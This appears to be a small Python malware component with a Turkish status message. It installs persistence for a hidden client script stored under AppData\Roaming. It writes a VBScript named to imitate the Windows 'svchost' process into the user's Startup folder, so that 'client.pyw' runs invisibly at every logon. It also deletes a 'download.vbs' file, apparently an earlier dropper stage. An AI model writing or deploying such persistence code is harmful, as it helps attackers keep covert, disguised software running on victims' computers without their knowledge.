import os

c = os.path.join(os.path.expanduser("~"), "AppData", "Roaming") + "\\pythonncc-main"
b = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
s = b + "\\svchost.vbs"
with open(s, "w", encoding='utf-8') as file:
    file.write("""Dim shell
Set shell = WScript.CreateObject("WScript.Shell")
shell.Run "{} {}", 0, True
Set shell = Nothing
""".format(c + "\\" + "pythonw.exe", c + "\\" + "client.pyw"))

os.remove(b + "\\download.vbs")

print("Dosya yazıldı")
